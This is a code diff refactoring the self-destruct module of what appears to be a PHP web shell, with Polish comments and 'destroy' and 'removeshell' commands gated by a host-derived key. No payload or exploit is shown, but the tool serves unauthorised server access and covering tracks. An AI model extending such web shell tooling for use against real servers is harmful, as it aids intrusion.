@@ -43,9 +43,9 @@ class ModuleDestroy extends ModuleAbstract
      * @param  object $oShell Obiekt Shell
      * @return void
      */
-    public function __construct(Shell $oShell)
+    public function __construct(Shell $oShell, Utils $oUtils = NULL, Args $oArgs = NULL)
     {
-        parent::__construct($oShell);
+        parent::__construct($oShell, $oUtils, $oArgs);
 
         $this->sKey = strtoupper(substr(md5(Request::getServer('HOST')), 0, 8));
 
@@ -58,10 +58,9 @@ class ModuleDestroy extends ModuleAbstract
      * @access public
      * @return array
      */
-    public function getCommands()
+    public static function getCommands()
     {
-        return array
-        (
+        return array(
             'destroy',
             'removeshell'
         );
@@ -73,7 +72,7 @@ class ModuleDestroy extends ModuleAbstract
      * @access public
      * @return string
      */
-    public function getVersion()
+    public static function getVersion()
     {
         /**
          * Wersja Data Autor
@@ -87,9 +86,9 @@ class ModuleDestroy extends ModuleAbstract
      * @access public
      * @return string
      */
-    public function getHelp()
+    public static function getHelp()
     {
-        return sprintf("Trwałe usuwanie shella\r\n\r\n\tUżycie:\r\n\t\tdestroy %s", $this->sKey);
+        return sprintf("Trwałe usuwanie shella\r\n\r\n\tUżycie:\r\n\t\tdestroy %s", '@todo');
     }
 
     /**
@@ -103,12 +102,12 @@ class ModuleDestroy extends ModuleAbstract
         /**
          * Help
          */
-        if ($this->oShell->getArgs()->getNumberOfParams() === 0) {
-            return $this->getHelp();
+        if ($this->oArgs->getNumberOfParams() === 0) {
+            return self::getHelp();
         }
 
-        $sKey = $this->oShell->getargs()->getParam(0);
-        $sFinalKey = $this->oShell->getargs()->getParam(1);
+        $sKey = $this->oArgs->getParam(0);
+        $sFinalKey = $this->oArgs->getParam(1);
 
         if (($sKey === $this->sKey)) {
             if ($sFinalKey === $this->sFinalKey) {
@@ -131,7 +130,7 @@ class ModuleDestroy extends ModuleAbstract
             }
         }
 
-        return $this->getHelp();
+        return self::getHelp();
     }
 
 }
